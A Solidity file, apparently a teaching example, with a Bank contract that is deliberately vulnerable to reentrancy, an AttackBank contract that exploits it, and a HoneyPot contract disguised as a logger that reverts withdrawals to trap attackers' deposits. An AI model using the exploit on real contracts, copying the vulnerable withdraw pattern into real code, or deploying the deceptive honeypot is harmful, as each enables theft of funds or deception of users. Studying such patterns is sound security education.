// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
}

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "failed to send ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "withdraw");
    }
}

contract AttackBank {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract HoneyPot {
    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        if (equal(_action, "withdraw")) {
            revert("it's a trap");
        }
    }

    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}